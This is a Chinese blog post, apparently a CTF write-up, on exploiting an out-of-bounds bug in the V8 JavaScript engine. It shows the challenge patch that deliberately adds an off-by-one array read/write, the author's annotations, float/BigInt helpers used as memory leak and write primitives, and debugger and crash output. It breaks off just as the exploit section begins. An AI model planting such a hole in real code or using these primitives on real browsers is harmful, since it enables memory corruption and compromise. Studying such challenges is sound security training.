<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>V8 EXPLOIT ONE | I0gan's blog</title><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script>var config = {"root":"/","path":""}</script><script src="//unpkg.com/mermaid@8.13.5/dist/mermaid.min.js"></script><script>mermaid.initialize({
 startOnLoad: true
 , theme: 'dark'
});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.4.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body style="background-image:url(https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg);"><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/shell/"><span class="navItemTitle">Shell</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>V8 EXPLOIT ONE</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2021-03-30T11:28:43.000Z" id="date"> 2021-03-30</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-10-24T09:04:17.825Z" id="updated"> 2022-10-24</time></div></span><br><span>Word Count: <div class="control">3.4k</div></span><br><span>Read Time: <div class="control">18 min</div></span></div></div><hr><div id="post-content"><h1 id="V8初探"><a href="#V8初探" class="headerlink" title="V8初探"></a>V8初探</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前早就在ctf上看见过类似的v8引擎题，比如sctf，Downunder Ctf等等，这篇文章就来复现一下underdown ctf中的一个d8 pwn题，这也是个历年谷歌浏览器漏洞的一个cve，本篇参考faith的文章来学习一下v8。</p>
<p>ref:  <a target="_blank" rel="noopener" href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</a></p>
<p>题目: <a target="_blank" rel="noopener" href="https://github.com/Changochen/CTF/raw/master/2019/*ctf/Chrome.tar.gz">下载</a></p>
<p>下载好之后有几个文件如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[i0gan@arch Chrome]$ ls<br>ld-linux-x86-64.so.2  libc.so.6  oob.diff  Release<br></code></pre></td></tr></table></figure>



<h2 id="编译-v8"><a href="#编译-v8" class="headerlink" title="编译 v8"></a>编译 v8</h2><p>首先先下载谷歌的depot_tools</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git<br></code></pre></td></tr></table></figure>

<p>设置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">echo &quot;export PATH=/home/i0gan/share/project/v8/tools/depot_tools:$PATH&quot; &gt;&gt; ~/.bashrc<br></code></pre></td></tr></table></figure>



<p>下载v8源码，这里需要翻墙下载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">fetch v8<br></code></pre></td></tr></table></figure>

<p>有点大，有3个多G</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cd v8<br>./build/install-build-deps.sh #这里采用ubuntu进行执行，我采用docker下的ubuntu16来进行构建编译环境的<br>git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598 # 切换到漏洞版本<br>gclient sync<br>git apply ../Chrome/oob.diff<br></code></pre></td></tr></table></figure>

<p>在ubuntu16下进行编译</p>
<h3 id="编译debug版"><a href="#编译debug版" class="headerlink" title="编译debug版"></a>编译debug版</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">./tools/dev/v8gen.py x64.debug<br>ninja -C ./out.gn/x64.debug<br></code></pre></td></tr></table></figure>

<h3 id="编译release版"><a href="#编译release版" class="headerlink" title="编译release版"></a>编译release版</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">./tools/dev/v8gen.py x64.release<br>ninja -C ./out.gn/x64.release<br></code></pre></td></tr></table></figure>

<p>下载还有编译过程需要时间有点长，耐心等待下，这里我就编译debug版本的，编译出来的文件会放在 <code>v8/out.gn/x64.debug/d8</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">i0gan@1ae6cc5c827a:/home/project/v8/challs/chall_1/v8/out.gn$ du -sh x64.debug/<br>4.6G    x64.debug/<br></code></pre></td></tr></table></figure>



<h2 id="Patch文件"><a href="#Patch文件" class="headerlink" title="Patch文件"></a>Patch文件</h2><p>oob.diff文件如下</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span><br><span class="hljs-comment">index b027d36..ef1002f 100644</span><br><span class="hljs-comment">--- a/src/bootstrapper.cc</span><br><span class="hljs-comment">+++ b/src/bootstrapper.cc</span><br><span class="hljs-meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,<br>                           Builtins::kArrayPrototypeCopyWithin, 2, false);<br>     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,<br>                           Builtins::kArrayPrototypeFill, 1, false);<br><span class="hljs-addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span><br><span class="hljs-addition">+                          Builtins::kArrayOob,2,false);</span><br>     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,<br>                           Builtins::kArrayPrototypeFind, 1, false);<br>     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,<br><span class="hljs-comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="hljs-comment">index 8df340e..9b828ab 100644</span><br><span class="hljs-comment">--- a/src/builtins/builtins-array.cc</span><br><span class="hljs-comment">+++ b/src/builtins/builtins-array.cc</span><br><span class="hljs-meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,<br>   return *final_length;<br> &#125;<br> &#125;  // namespace<br><span class="hljs-addition">+BUILTIN(ArrayOob)&#123;</span><br><span class="hljs-addition">+    uint32_t len = args.length();</span><br><span class="hljs-addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="hljs-addition">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="hljs-addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="hljs-addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="hljs-addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="hljs-addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="hljs-addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span><br><span class="hljs-addition">+    if(len == 1)&#123;</span><br><span class="hljs-addition">+        //read</span><br><span class="hljs-addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="hljs-addition">+    &#125;else&#123;</span><br><span class="hljs-addition">+        //write</span><br><span class="hljs-addition">+        Handle&lt;Object&gt; value;</span><br><span class="hljs-addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="hljs-addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="hljs-addition">+        elements.set(length,value-&gt;Number());</span><br><span class="hljs-addition">+        return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="hljs-addition">+    &#125;</span><br><span class="hljs-addition">+&#125;</span><br> <br> BUILTIN(ArrayPush) &#123;<br>   HandleScope scope(isolate);<br><span class="hljs-comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span><br><span class="hljs-comment">index 0447230..f113a81 100644</span><br><span class="hljs-comment">--- a/src/builtins/builtins-definitions.h</span><br><span class="hljs-comment">+++ b/src/builtins/builtins-definitions.h</span><br><span class="hljs-meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;<br>   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \<br>   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \<br>   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \<br><span class="hljs-addition">+  CPP(ArrayOob)                                                                \</span><br>                                                                                \<br>   /* ArrayBuffer */                                                            \<br>   /* ES #sec-arraybuffer-constructor */                                        \<br><span class="hljs-comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="hljs-comment">index ed1e4a5..c199e3a 100644</span><br><span class="hljs-comment">--- a/src/compiler/typer.cc</span><br><span class="hljs-comment">+++ b/src/compiler/typer.cc</span><br><span class="hljs-meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;<br>       return Type::Receiver();<br>     case Builtins::kArrayUnshift:<br>       return t-&gt;cache_-&gt;kPositiveSafeInteger;<br><span class="hljs-addition">+    case Builtins::kArrayOob:</span><br><span class="hljs-addition">+      return Type::Receiver();</span><br> <br>     // ArrayBuffer functions.<br>     case Builtins::kArrayBufferIsView:<br></code></pre></td></tr></table></figure>



<p>这个patch中修改了src&#x2F;bootstrapper.cc，src&#x2F;builtins&#x2F;builtins-array.cc， src&#x2F;builtins&#x2F;builtins-definitions.h，src&#x2F;compiler&#x2F;typer.cc文件，然而变动最大的就是</p>
<p>src&#x2F;builtins&#x2F;builtins-array.cc文件，漏洞也在这个文件中，作者呢也强烈要求读者去自己尝试把漏洞标记出来，下面注释就是我做的一些解释，如下</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,<br>   return *final_length;<br> &#125;<br> &#125;  // namespace<br> // 漏洞patch<br><span class="hljs-addition">+BUILTIN(ArrayOob)&#123;</span><br><span class="hljs-addition">+    uint32_t len = args.length();</span><br><span class="hljs-addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value(); // 如果参数大于2，返回undefined</span><br><span class="hljs-addition">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="hljs-addition">+    // 执行一下的就要满足 len &lt;= 1，所以只剩下一个arg传入进来</span><br><span class="hljs-addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="hljs-addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="hljs-addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver); //获取array</span><br><span class="hljs-addition">+    //将array元素强制转换为FixedDoubleArray</span><br><span class="hljs-addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="hljs-addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number()); // 再获取数组的长度</span><br><span class="hljs-addition">+    if(len == 1)&#123;</span><br><span class="hljs-addition">+        //read</span><br><span class="hljs-addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="hljs-addition">+    &#125;else&#123; //如果len &lt;= 0 </span><br><span class="hljs-addition">+        //write</span><br><span class="hljs-addition">+        Handle&lt;Object&gt; value;</span><br><span class="hljs-addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="hljs-addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="hljs-addition">+        elements.set(length,value-&gt;Number()); // 设置长度为 atgs.at&lt;Object&gt;(1) 的int值，漏洞点，若能控制atgs.at&lt;Object&gt;(1)，就可以达到数组越界</span><br><span class="hljs-addition">+        return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="hljs-addition">+    &#125;</span><br><span class="hljs-addition">+&#125;</span><br></code></pre></td></tr></table></figure>

<p>下面贴下作者的原话:</p>
<p>I urge the reader to take a look at the code added to <code>src/builtins/builtins-array.cc</code> and try to spot the vulnerability. Even without any further context, it should be easy to spot.</p>
<ul>
<li>The function will initially check if the number of arguments is greater than 2 (the first argument is always the <code>this</code> argument). If it is, it returns undefined.</li>
<li>If there is only one argument (<code>this</code>), it will cast the array into a <code>FixedDoubleArray</code> before returning the element at <code>array[length]</code>.</li>
<li>If there are two arguments (<code>this</code> and <code>value</code>), it will write <code>value</code> as a float into <code>array[length]</code>.</li>
</ul>
<p>Now, since arrays start with index 0, it is evident that <code>array[length]</code> results in an out-of-bounds access by one index at the end of the array.</p>
<p>那么按照作者介绍js中的三种类型，v8采用一种pointer taggin的机制去分辨pointer，double还有smis类型，都代表一种快速小的整数，这些信息可以在src&#x2F;objects.h中找到。三种类型分别分别定义如下:</p>
<pre><code>* Double: Shown as the 64-bit binary representation without any changes
* Smi: Represented as value &lt;&lt; 32, i.e 0xdeadbeef is represented as 0xdeadbeef00000000
* Pointers: Represented as addr &amp; 1. 0x2233ad9c2ed8 is represented as 0x2233ad9c2ed9
</code></pre>
<p>还有一 注意的是，v8泄漏任何信息都以浮点数进行打印，也没有任何方式去正常表达64位的整型变量，所以的采用js的某些特殊手段将内存中的float类型以16进制方式打印出来，下面是作者提供的转换函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/// Helper functions to convert between float and integer primitives</span><br><span class="hljs-keyword">var</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">8</span>); <span class="hljs-comment">// 8 byte array buffer</span><br><span class="hljs-keyword">var</span> f64_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(buf);<br><span class="hljs-keyword">var</span> u64_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(buf);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ftoi</span>(<span class="hljs-params">val</span>) &#123; <span class="hljs-comment">// typeof(val) = float</span><br>    f64_buf[<span class="hljs-number">0</span>] = val;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">BigInt</span>(u64_buf[<span class="hljs-number">0</span>]) + (<span class="hljs-title class_">BigInt</span>(u64_buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">32n</span>); <span class="hljs-comment">// Watch for little endianness</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">itof</span>(<span class="hljs-params">val</span>) &#123; <span class="hljs-comment">// typeof(val) = BigInt</span><br>    u64_buf[<span class="hljs-number">0</span>] = <span class="hljs-title class_">Number</span>(val &amp; <span class="hljs-number">0xffffffffn</span>);<br>    u64_buf[<span class="hljs-number">1</span>] = <span class="hljs-title class_">Number</span>(val &gt;&gt; <span class="hljs-number">32n</span>);<br>    <span class="hljs-keyword">return</span> f64_buf[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ftoi: 将浮点类型转换为BigInt类型，用于泄漏内存</p>
<p>itof: 将BigInt类型转换为浮点类型，用于写入到内存，因为d8都是采用浮点类型进行储存的，采用一定转换后的格式才能正确在内存中写入值。</p>
<p>将上面保存为file.js</p>
<p>可以运行d8如下去执行，可以通过脚本实现转换。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">./d8 --shell ./file.js<br></code></pre></td></tr></table></figure>



<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">V8 version 7.5.0 (candidate)<br>d8&gt; ftoi(1234)<br>4653142004841054208n<br>d8&gt; itof(4653142004841054208n)<br>1234<br></code></pre></td></tr></table></figure>



<h2 id="数组末尾储存的是什么？"><a href="#数组末尾储存的是什么？" class="headerlink" title="数组末尾储存的是什么？"></a>数组末尾储存的是什么？</h2><p>可以通过到谷歌官方source code <a target="_blank" rel="noopener" href="https://source.chromium.org/">https://source.chromium.org</a> 查看源代码，但是不推荐，除非要有深刻的理解v8的代码才能知道内存的布局是什么。有另一种方法可以去知道内存布局。</p>
<p>通过debug版本的d8，可以实时的打印数组的内存布局，执行命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">./d8 --allow-natives-syntax<br></code></pre></td></tr></table></figure>

<p>若想进入到某些调试函数的话，可以采用%DebugPrint()</p>
<p>采用gdb调试效果如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb ./d8<br>pwndbg&gt; run --allow-natives-syntax<br>Starting program: /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/d8 --allow-natives-syntax<br>warning: Error disabling address space randomization: Operation not permitted<br>[Thread debugging using libthread_db enabled]<br>Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.<br>[New Thread 0x7f9e54b5a700 (LWP 52)]<br>[New Thread 0x7f9e54359700 (LWP 53)]<br>[New Thread 0x7f9e53b58700 (LWP 54)]<br>[New Thread 0x7f9e53357700 (LWP 55)]<br>[New Thread 0x7f9e52b56700 (LWP 56)]<br>[New Thread 0x7f9e52355700 (LWP 57)]<br>[New Thread 0x7f9e51b54700 (LWP 58)]<br>V8 version 7.5.0 (candidate)<br>d8&gt; var a = [1.1, 2.2]; //定义触发漏洞的数组<br>undefined<br>d8&gt; %DebugPrint(a);<br>DebugPrint: 0x103bc188dd79: [JSArray]<br> - map: 0x206bc6402ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]<br> - prototype: 0x0c7064ed1111 &lt;JSArray[0]&gt;<br> - elements: 0x103bc188dd59 &lt;FixedDoubleArray[2]&gt; [PACKED_DOUBLE_ELEMENTS]<br> - length: 2<br> - properties: 0x305fab880c71 &lt;FixedArray[0]&gt; &#123;<br>    #length: 0x2108dfb001a9 &lt;AccessorInfo&gt; (const accessor descriptor)<br> &#125;<br> - elements: 0x103bc188dd59 &lt;FixedDoubleArray[2]&gt; &#123;<br>           0: 1.1<br>           1: 2.2<br> &#125;<br>0x206bc6402ed9: [Map]<br> - type: JS_ARRAY_TYPE<br> - instance size: 32<br> - inobject properties: 0<br> - elements kind: PACKED_DOUBLE_ELEMENTS<br> - unused property fields: 0<br> - enum length: invalid<br> - back pointer: 0x206bc6402e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;<br> - prototype_validity cell: 0x2108dfb00609 &lt;Cell value= 1&gt;<br> - instance descriptors #1: 0x0c7064ed1f49 &lt;DescriptorArray[1]&gt;<br> - layout descriptor: (nil)<br> - transitions #1: 0x0c7064ed1eb9 &lt;TransitionArray[4]&gt;Transition array #1:<br>     0x305fab884ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x206bc6402f29 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;<br><br> - prototype: 0x0c7064ed1111 &lt;JSArray[0]&gt;<br> - constructor: 0x0c7064ed0ec1 &lt;JSFunction Array (sfi = 0x2108dfb0aca1)&gt;<br> - dependent code: 0x305fab8802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;<br> - construction counter: 0<br><br>[1.1, 2.2]<br>d8&gt;<br></code></pre></td></tr></table></figure>

<p>然而发现上面创建了4个线程，不方便调试通过设置UV_THREADPOOL_SIZE环境变量来改d8启动的线程数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">UV_THREADPOOL_SIZE=1<br></code></pre></td></tr></table></figure>

<p>尝试了，不行。</p>
<p>在调用数组oob()函数的时候崩溃。。。Arch linux与Ubuntu执行效果一样，出现了内存错误。。。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">d8&gt; a.oob()<br>#<br># Fatal error in ../../src/objects/fixed-array-inl.h, line 321<br># Debug check failed: index &gt;= 0 &amp;&amp; index &lt; this-&gt;length().<br>#<br>#<br>#<br>#FailureMessage Object: 0x7ffc874a2430<br>==== C stack trace ===============================<br><br>    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x21) [0x7f4f5960bcd1]<br>    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8_libplatform.so(+0x3fbb7) [0x7f4f595a4bb7]<br>    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x218) [0x7f4f595f7438]<br>    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8_libbase.so(+0x35e7c) [0x7f4f595f6e7c]<br>    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x27) [0x7f4f595f7507]<br>    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8.so(v8::internal::FixedDoubleArray::get_scalar(int)+0x15d) [0x7f4f5797ed2d]<br>    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8.so(+0x14fdf27) [0x7f4f57973f27]<br>    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8.so(v8::internal::Builtin_ArrayOob(int, unsigned long*, v8::internal::Isolate*)+0xed) [0x7f4f57973b8d]<br>    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8.so(+0x2a5a0c0) [0x7f4f58ed00c0]<br>Received signal 4 ILL_ILLOPN 7f4f59609271<br>Illegal instruction (core dumped)<br></code></pre></td></tr></table></figure>









<h2 id="Downunder-ctf-is-this-pwn-or-web"><a href="#Downunder-ctf-is-this-pwn-or-web" class="headerlink" title="Downunder ctf [is-this-pwn-or-web]"></a>Downunder ctf [is-this-pwn-or-web]</h2><p>查看diff文件与之前一样，下面为作者具体利用思路。</p>
<p>更新中…</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 